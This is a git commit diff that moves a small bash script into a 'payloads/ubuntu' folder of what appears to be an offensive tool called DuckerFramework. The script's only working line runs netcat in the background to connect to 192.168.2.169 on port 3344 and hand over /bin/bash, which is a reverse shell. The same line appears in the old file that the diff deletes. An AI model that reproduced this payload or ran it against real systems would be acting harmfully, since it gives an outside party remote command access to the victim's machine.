4d282c7fd782a0e5079d11c5cd9476c26300bab8
Juan <juanpabloaccinelli@gmail.com>
2020-06-04 23:42:24 -0300

    jp

---
+++ payloads/ubuntu/duckerClientInitializer.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+#This scripts initializes the client for the DuckerFramework for UBUNTU.
+nohup nc.traditional 192.168.2.169 3344 -e /bin/bash &
--- payloadubuntu.sh
+++
@@ -1,2 +0,0 @@
-#!/bin/bash
-nohup nc.traditional 192.168.2.169 3344 -e /bin/bash &
